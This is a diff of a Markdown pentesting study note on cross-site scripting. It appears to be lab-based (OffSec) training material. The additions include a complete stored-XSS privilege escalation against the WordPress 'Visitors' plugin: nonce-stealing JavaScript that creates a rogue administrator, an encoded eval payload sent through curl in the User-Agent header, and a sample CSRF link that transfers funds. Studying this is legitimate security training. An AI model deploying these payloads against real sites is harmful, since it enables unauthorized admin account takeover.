@@ -43,9 +43,9 @@ Example:
 > As some modern browsers may block the ```alert()``` JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS.
 
 >[!TIP]
-> ```<plaintext>``` <br>
+> `<plaintext>` <br>
 > It will stop rendering the HTML code that comes after it and displays it as plaintext <br><br>
-> ```<script>print()</script>``` <br>
+> `<script>print()</script>` <br>
 > It will pop up the browser print dialog
 
 ## Reflected XSS
@@ -133,6 +133,25 @@ The above line creates a new HTML image object, which has a ```onerror``` attrib
 > [!NOTE]
 > To target a user with this DOM XSS vuln, you can copy the URL from the browser and shre it with them, and once they visit it, the JavaScript code should execute.
 
+## JavaScript Refresher
+
+When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it. The DOM is comprised of all forms, inputs, images, etc. related to the web page.
+
+JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience. From an attacker's perspective, this also means that if you can inject JavaScript code into the application, you can access and modify the page's DOM. With access to the DOM, you can redirect login forms, extract passwords, and steal session cookies.
+
+Like many other programming languages, JavaScipt can combine a set of instructions into a function.
+
+```js
+function multiplyValues(x,y) {
+  return x * y;
+}
+ 
+let a = multiplyValues(3, 5)
+console.log(a)
+```
+
+When declaring the `a` variable, you don't assign just any type to the variable, since JavaScript is a loosely typed language. This means that the actual type of the "a" variable is inferred as a Number type based on the type of the invoked function arguments, which are Number types.
+
 ## XSS Discovery
 
 In web application vulnerabilities, detecting them can become as difficult as exploiting them. Fortunately, there are lots of tools that can help you in detecting and identifying XSS.
@@ -177,11 +196,26 @@ Payload lists are:
 
 You can begin testing these payloads one by one by copying each one and adding it in your form, and seeing whether an alert box pops up.
 
+Besides that you can also just input special chars and observe the output to determine if any of the special chars return unfiltered.
+
+The most common special chars used for this purpose include:
+
+```
+< > ' " { } ;
+```
+
+If the application does not remove or encode these chars, it may be vulnerable to XSS because the app interprets the chars as code, which in turn, enables additional code.
+
+While there are multiple types of encoding, the most common you'll encounter in web apps are [HTML encoding](https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references) and [URL encoding](https://en.wikipedia.org/wiki/Percent-encoding) (_sometimes referred to as percent encoding_).
+
 ### Code Review
 
 ... is the most reliable method of detecting XSS vulnerabilities. If you understand precisely how your input is being handled all the way until it reaches the web browser, you can write a custom payload that should work with high confidence.
 
 ## XSS Attacks
+
+> [!CAUTION]
+> The following sub-chapters are only a couple of examples of a multitude of XSS attack vectors.
 
 ### Defacing
 
@@ -497,6 +531,171 @@ Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 ```
 
 Finally, you can use this cookie on the login page to acces the victim's account. For that, you need to add the cookie name (_part of the request made on your server before the '='_) and the cookie value (_the part after the '='_). Once the cookie is set, you can refresh the web page and you will get access as the victim.
+
+### PrivEsc
+
+#### Stored XSS
+
+**Example**: WordPress plugin `Visitors`, which is vulnerable to stored XSS.
+
+`database.php`:
+
+```php
+function VST_save_record() {
+	global $wpdb;
+	$table_name = $wpdb->prefix . 'VST_registros';
+
+	VST_create_table_records();
+
+	return $wpdb->insert(
+				$table_name,
+				array(
+					'patch' => $_SERVER["REQUEST_URI"],
+					'datetime' => current_time( 'mysql' ),
+					'useragent' => $_SERVER['HTTP_USER_AGENT'],
+					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
+				)
+			);
+}
+```
+
+Each time a WordPress administrator loads the Visitors plugin, the function will execute the following portion of code from `start.php`:
+
+```php
+$i=count(VST_get_records($date_start, $date_finish));
+foreach(VST_get_records($date_start, $date_finish) as $record) {
+    echo '
+        <tr class="active" >
+            <td scope="row" >'.$i.'</td>
+            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
+            <td scope="row" >'.$record->patch.'</td>
+            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
+            <td>'.$record->useragent.'</td>
+        </tr>';
+    $i--;
+}
+```
+
+As the User-Agent header is under user control, you could craft an XSS attack by inserting a script tag invoking the `alert()` method to generate a pop-up message.
+
+Using Burp, trying for the abovementioned technique gets you a `200 OK` response indicating that the payload is now stored in the WordPress database.
+
+#### CSRF Token (_Nonce_) Extraction
+
+> [!INFO]
+> You could leverage XSS to steal cookies and session information if the application uses an insecure session management configuration. If you can steal an authenticated user's cookie, you could masquerade as that user within the target website.
+> 
+> Websites use cookies to track state and information about users. Cookies can be set with several optional flags, including two that are particularly interesting to you as pentesters: **Secure** and **HttpOnly**.
+> 
+> The **Secure** flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
+> 
+> The **HttpOnly** flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, you can use an XSS payload to steal the cookie.
+
+Verify the nature of WordPress' session cookies by first logging in as the admin user.
+
+![xss offsec 1](../../../../images/xss_offsec1.png)
+
+You notice that your browser has stored six different cookies, but only four are session cookies. Of these four cookies, if you exclude the negligible `wordpress_test_cookie`, all support the HttpOnly feature.
+
+Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be retrieved via JavaScript through your attack vector.
+
+When the admin loads the Visitors plugin dashboards that contains injected JavaScript, it executes whatever you provide as a payload.
+
+For instance, you could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes your injected code, the function will execute behind the scenes.
+
+The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent CSRF attacks.
+
+> [!INFO]
+> A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalt of the user.
+> 
+> The malicious link could be disguised by an apparently harmless description, often luring the victim to click on it.
+> 
+> `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000""\> Check out these awesome cat memes!</a>`
+
+In this case, by including and checking the pseudo-random nonce, WordPress prevents this kind of attack, since an attacker could not have prior knowledge of the token. However, the nonce won't be an obstacle for the stored XSS vuln.
+
+To perform any administrative action, you need to first gather the nonce. You can accomplish this using the following JavaScript function:
+
+```js
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+...
+```
+
+This function performs a new HTTP request towards the `/wp-admin/user-new.php` URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string `/ser " value="` and double quotes.
+
+Now that you've dynamically retrieved the nonce, you can craft the main function responsible for creating the new admin user.
+
+```js
+...
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+
+#### Minification and Encoding
+
+To ensure that your JavaScript payload will be handled correctly by Burp and the target application, you need to first minify it, then encode it.
+
+To minify your attack code into a one-liner, you can navigate to [JS Compress](https://jscompress.com/). Resulting in:
+
+```js
+var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
+```
+
+As a final step, you'll encode the minified JavaScript code, so any bad chars won't interfere with sending the payload.
+
+You can do this using the following function:
+
+```js
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+```
+
+The `encode_to_javascript` function will parse the minified JS string parameter and convert each char into the corresponding UTF-16 integer code using the `charCodeAt` method.
+
+![xss offsec 2](../../../../images/xss_offsec2.png)
+
+#### Authenticated Action Extraction
+
+You are going to decode and execute the encoded string by first decoding the string with the `fromCharCode` method, then running it via the `eval()` method. Once you have coped the encoded string, you can insert it with the following `curl` command and launch the attack.
+
+```bash
+kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
+```
+
+You instructed curl to send a specifically-crafted HTTP request with a User-Agent header containing your malicious payload, then forward it to you Burp instance so you can inspect it further.
+
+If everything seems correct, forward the request.
+
+At this point, your XSS exploit should have been stored in the WordPress database. You only need to simulate execution by logging in to the OffSec WP instance as admin, then clicking on the Visitors plugin dashboard on the bottom left.
+
+![xss offsec 3](../../../../images/xss_offsec3.png)
+
+You notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained your attack embedded into script tags, so the browser cannot render any string from it.
+
+By loading the plugin statistics, you should have executed the malicious script.
+
+![xss offsec 4](../../../../images/xss_offsec4.png)
 
 ## XSS Prevention
 
